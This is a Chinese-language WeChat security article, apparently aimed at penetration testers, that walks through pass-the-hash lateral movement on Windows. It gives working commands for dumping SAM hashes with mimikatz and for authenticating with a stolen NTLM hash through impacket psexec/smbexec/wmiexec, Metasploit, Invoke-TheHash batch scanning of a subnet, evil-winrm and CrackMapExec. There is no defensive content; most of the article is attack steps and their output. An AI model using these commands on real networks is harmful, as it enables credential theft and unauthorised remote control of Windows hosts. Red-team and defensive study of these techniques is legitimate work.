> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mSCsXYoYyUnnAbNAQFrlhw)

本文来自 “白帽子社区知识星球”

**0****1**

  

前⾔

随着攻防演练的频繁和⼈们安全意识的提升，企业内部 Windows 主机的⼝令也设置的较为复杂，经 常拿到 windows 服务器的时候，获取到了 hash，但是⽆法解密出密码的情况，这时候就需要⽤到内⽹ hash 传递技术。使⽤该⽅法，攻击者不需要花费时间来怼 hash 进⾏爆破，常常适⽤于域 / ⼯作组等环境中。

**0****2**

  

测试环境

Windows server 2012 ⾸先需要获取 ntml hash，由于直接从内存读取到的可能是密码修改之前的 hash，这⾥推荐从 sam ⽂件中读取

```
mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::sam""exit"

```

这⾥获取到的是: 47bf8039a8506cd67c524a03ff84ba4e

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjtHOUsyYAibD5X6xnkL7ZOSVlgvnDeFtpEic5Kljg5w16jNk4ZvQlmp9A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

对于⼀些远程命令的执⾏⽅式和依赖端⼝

```
IPC$+AT   445
PSEXEC 445
WMI 135
Winrm    5985(HTTP) 5986(HTTPS)

```

**135 端⼝ wmi 哈希传递**

wmi （Windows management Instrumentation） 即 windows 管理⼯具，windows 98 之后的操作 系统都⽀持 wmi，默认开启，且 windows 默认不会将 wmi 的操作记录到⽇志。wmi 并不⽀持直接执⾏命令，但可以执⾏⽂件，通过增加执⾏程序参数的⽅式执⾏命令的效果；但 是 wmi 是不⽀持返回的，执⾏完之后并不能看到回显

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjD9xttvxgWiaCibjejyNetCwZ6zzKCenFicYtsUHHiaDHB0tt2tPoURNqlQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

有些⼯具的原理是 wmi 创建进程执⾏命令，然后将结果输出到⽂件，这个⽂件位于创建的共享⽂件 夹中，然后通过 FSO 组件访问远程共享⽂件夹中的结果，将⽂件进⾏输出。读取完成后，执⾏ wmi 命令删除⽂件，然后退出删除⽂件共享。其中常⽤的⼯具是 impacket 中的 wimiexec 利⽤⽅式如下，此时的 135 和 445 端⼝都开放

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjygKIHuleLib6Q4ibmbSSod4wBn2eL6GBe9U2yE1XejmG6NvgubxNbwTw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjMS9zfA7kpe5WWIc2Igw8rtRYDuyicJfT2VwagWj1GfK2r7P6AGbr1NQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

若遇到只开放 135 的情况，可以增加 nooutput 参数，不进⾏输出  

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjJ4OcLIbC1lXcKvIBWfhV0lWE9CQTQq1oCssnMEVShMMpfEu2KTVLxA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjQ4npRmTEXPx2xVGExRcrg2IeugB1ibIfgo7DRTAX9rAG3Lbkw0v2KMg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

成功执⾏了 whoami 命令

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjtOgtoCLEFTR8QiaXOKicdV2SesSxibibbOb4qoHq7nRoicym9zotA5PQ5xA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

另外，还可通过 wmicmd.exe 进⾏利⽤；WMICMD 的执⾏过程是吧结果写⼊倒注册表，之后读 取完注册表之后并删除，然后回显到本地，由于 wmi 可以远程操作注册表的信息，查询的注册表 信息会产⽣回显  

```
https://github.com/nccgroup/WMIcmd

```

**445 端⼝ SMB hash 传递 445 端⼝ SMB hash 传递**

利⽤ Windows 的 smb 服务⾸先需要建⽴ ipc，可以使⽤ hash 传递来进⾏攻击，需要⽬标防⽕ 墙允许 445 端⼝的通过。PsExec 是⼀种轻型 telnet-replacement，可⽤于在其他系统上执⾏进 程，⽆需⼿动安装客户端软件即可完成 控制台应⽤程序的完整交互性。 

**Impacket**

利⽤ impacket 中的 psexec 程序，命令如下：

```
python3 psexec.py -hashes 0:47bf8039a8506cd67c524a03ff84ba4e
Administrator@192.168.31.61

```

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjGZSyomZyxY8IiaC1yF9ibqYrDOWMBpnxcyIzZoSH6TvhtfGgrCxCtNpg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

利⽤ impacket 中的 smbexec 程序，命令如下  

```
python3 smbexec.py -hashes
00000000000000000000000000000000:47bf8039a8506cd67c524a03ff84ba4e
Administrator@192.168.31.61

```

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjotc5b9cWcUVQY0Bo8h5VtpUibFTFmFUcn1YStYI0qjSawOaRcBKSUPA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**利⽤ msf**

利⽤ msf 进⾏ pth  

```
use exploit/windows/smb/psexec
set rhosts 192.168.31.194
set smbuser administrator
set smbpass
00000000000000000000000000000000:47bf8039a8506cd67c524a03ff84ba4e

```

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjkyXrsOoDUrmUYibtQIKbbSS6leLy2e69Iqib5QziaA0o93mn3EQQan3Xw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**0****3**

  

通过 powershell 批量

脚本地址：

```
https://github.com/Kevin-Robertson/Invoke-TheHash

```

```
本地加载powershell脚本：
powershell -exec bypass
SET-EXECUTIONPOL
ICY REMOTESIGNED
Import-Module .\Invoke-WMIExec.ps1
Import-Module .\Invoke-TheHash.ps1
# 利⽤已知的hash 对内⽹主机进⾏批量，域环境
Invoke-TheHash -Type WMIExec -Target 192.168.31.1/24 -Domain qq -Username
administrator -Hash 47bf8039a8506cd67c524a03ff84ba4e
# 利⽤已知的hash 对内⽹主机进⾏批量，⼯作组环境
Invoke-TheHash -Type WMIExec -Target 192.168.31.124 -Username
administrator -Hash 47bf8039a8506cd67c524a03ff84ba4e

```

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjjvoFrozaw3XZf8Hr9OdnAeXLjcibWFZ4R7NWpBNoe6zt3JIkl3LHG1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**0****4**

  

5985 HASH 传递

WinRM 是 Microsoft 对 WS-Management 协议的实现, WS-Management 协议即⼀种基于标准简单对象访问协 议 [SOAP] 的 “防⽕墙友好” 协议, 它让来⾃不同供应商的硬件和操作系统能够互相操作。winRM 的默认端⼝为 5985（http）或 5986（https）。winRM 横向移动同时适⽤于⼯作组和域环境。   

evil-winrm 是 Windows 远程管理 (WinRM) Shell 的终极版本。Windows 远程管理是 “WS 管理协议的 Microsoft 实施，该协议是基于标准 SOAP、不受防⽕墙影响的协议，允许不同供应商的硬件和操 作系统相互操作。⽽微软将其包含在他们的系统中，是为了便于系统管理员在⽇常⼯作中，远程管 理服务器，或通过脚本同时管理多台服务器，以提⾼他们的⼯作效率。

在 kali 进⾏安装

```
gem install evil-winrm

```

执⾏以下命令

```
evil-winrm -i 192.168.31.194 -u Administrator -H
47bf8039a8506cd67c524a03ff84ba4e

```

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7NecGfT3zop8H8chlEVwNjudp3jsL5BMpSH3bwoUwLqt8Hq0iaDuYiaONgPrbBzsLuEYV1j0c80s2Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**0****5**

  

CrackMapExec

另外⼀款⼯具就是 CrackMapExec， 安装⽅式

```
#~  apt-get install -y libssl-dev libkrb5-dev libffi-dev python-dev
build-essential
#~ git clone https://github.com/Porchetta-Industries/CrackMapExec
#~ cd CrackMapExec
#~ poetry install
#~ poetry run crackmapexec

```

使⽤⽅式

```
poetry run crackmapexec winrm 192.168.31.194 -u admin -H
00000000000000000000000000000000:47bf8039a8506cd67c524a03ff84ba4e -x
whoami

```

**侵权请私聊公众号删文**

 **热文推荐**  

*   [蓝队应急响应姿势之 Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  
    
*   [通过 DNSLOG 回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  
    
*   [记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  
    
*   [内网渗透初探 | 小白简单学习内网渗透](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523346&idx=1&sn=4bf01626aa7457c9f9255dc088a738b4&chksm=f9e3f349ce947a5f934329a78177b9ce85e625a36039008eead2fe35cbad5e96a991569d0b80&scene=21#wechat_redirect)  
    
*   [实战 | 通过恶意 pdf 执行 xss 漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523274&idx=1&sn=89290e2b7a8e408ff62a657ef71c8594&chksm=f9e3f491ce947d8702eda190e8d4f7ea2e3721549c27a2f768c3256de170f1fd0c99e817e0fb&scene=21#wechat_redirect)  
    
*   [免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523189&idx=1&sn=44ea2c9a59a07847e1efb1da01583883&chksm=f9e3f42ece947d3890eb74e4d5fc60364710b83bd4669344a74c630ac78f689b1248a2208082&scene=21#wechat_redirect)  
    
*   [内网渗透之内网信息查看常用命令](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522979&idx=1&sn=894ac98a85ae7e23312b0188b8784278&chksm=f9e3f5f8ce947cee823a62ae4db34270510cc64772ed8314febf177a7660de08c36bedab6267&scene=21#wechat_redirect)  
    
*   [关于漏洞的基础知识](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523083&idx=2&sn=0b162aba30063a4073bad24269a8dc0e&chksm=f9e3f450ce947d4699dfebf0a60a2dade481d8baf5f782350c2125ad6a320f91a2854d027e85&scene=21#wechat_redirect)  
    
*   [任意账号密码重置的 6 种方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522927&idx=1&sn=075ccdb91ae67b7ad2a771aa1d6b43f3&chksm=f9e3f534ce947c220664a938bc42926bee3ca8d07c6e3129795d7c8977948f060b08c0f89739&scene=21#wechat_redirect)  
    
*   [干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522810&idx=2&sn=ed65a8c60c45f9af598178ed20c89896&chksm=f9e3f6a1ce947fb710ff77d8fbd721220b16673953b30eba6b10ad6e86924f6b4b9b2a983e74&scene=21#wechat_redirect)  
    
*   [手把手教你 Linux 提权](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522500&idx=2&sn=ec74a21ef0a872f7486ccac6772e0b9a&chksm=f9e3f79fce947e89eac9d9077eee8ce74f3ab35a345b1c2194d11b77d5b522be3b269b326ebf&scene=21#wechat_redirect)
    

****欢迎关注 LemonSec****

**觉得不错点个 **“赞”**、“在看 “**